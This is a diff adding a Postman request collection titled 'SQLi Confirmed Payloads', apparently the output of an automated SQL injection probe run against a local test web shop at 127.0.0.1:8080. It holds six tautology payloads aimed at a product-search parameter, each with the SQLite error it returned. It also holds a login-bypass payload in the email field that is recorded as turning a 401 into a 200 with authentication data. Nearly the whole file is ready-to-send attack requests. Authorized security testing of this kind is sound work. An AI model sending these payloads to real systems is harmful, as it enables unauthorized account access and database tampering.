@@ -1,0 +1,228 @@
+{
+  "info": {
+    "name": "SQLi Confirmed Payloads",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "description": "Generated from confirmed local SQLi probe evidence. Run only against an authorized local target."
+  },
+  "item": [
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27a",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='a"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27b",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='b"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27c",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='c"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27d",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='d"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27e",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='e"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "GET /rest/products/search - q",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27g",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "products",
+            "search"
+          ],
+          "query": [
+            {
+              "key": "q",
+              "value": " OR 'a'='g"
+            }
+          ]
+        },
+        "description": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> "
+      }
+    },
+    {
+      "name": "POST /rest/user/login - email",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "url": {
+          "raw": "http://127.0.0.1:8080/rest/user/login",
+          "protocol": "http",
+          "host": [
+            "127",
+            "0",
+            "0",
+            "1"
+          ],
+          "port": "8080",
+          "path": [
+            "rest",
+            "user",
+            "login"
+          ],
+          "query": []
+        },
+        "description": "Baseline returned 401, probe returned 200 with authentication data.",
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"email\": \"' OR '' = '' --\",\n  \"password\": \"agent_baseline\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
